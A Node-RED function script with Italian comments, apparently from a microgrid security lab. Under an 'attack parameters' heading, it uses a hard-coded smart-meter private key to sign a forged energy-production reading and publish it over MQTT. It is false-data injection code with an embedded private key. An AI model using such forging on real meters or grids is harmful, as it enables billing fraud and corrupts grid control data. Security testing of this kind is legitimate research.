const crypto = global.get('crypto') || require('crypto');

// --- 1. CONFIGURAZIONE NODO ---
const nodeId = "SmartMeter_0001_d6622a65";
const privateKey = `-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgZStkjWwSQx5Cfinv
yqwYRqnFYsHSC71fQo7uvbr327WhRANCAAR6YmZtXU8aJmcPjodE6vTKWbUdEK1F
2GC8uWilOucyHh5D5a8Yuuanks350xFrQ8LkPDQ+gre1hc1ezwhOo9Yx
-----END PRIVATE KEY-----`;

// --- 2. PARAMETRI DELL'ATTACCO ---
const timestamp = Math.floor(Date.now() / 1000);

// Usa valori con decimali reali per evitare la cancellazione degli zeri da parte di JS!
// (Esattamente come fa il device reale)
const production = 8500.55;

// --- 3. CREAZIONE DELL'OGGETTO ESATTO DA FIRMARE ---
// Creiamo l'oggetto base nello stesso identico ordine in cui lo aspetta Python
const basePayload = {
    node_id: nodeId,
    timestamp: timestamp,
    production: production
};

// JS serializza questo oggetto togliendo gli spazi, esattamente come farà
// json.dumps(..., separators=(',', ':')) in Python.
const payloadStr = JSON.stringify(basePayload);

// --- 4. FIRMA DELLA STRINGA ESATTA ---
const sign = crypto.createSign('SHA256');
sign.update(payloadStr);
sign.end();
const signatureHex = sign.sign(privateKey, 'hex');

// --- 5. AGGIUNTA DELLA FIRMA E SPEDIZIONE ---
basePayload.sig = signatureHex;

msg.payload = basePayload;
msg.topic = "microgrid/production/" + nodeId;

return msg;
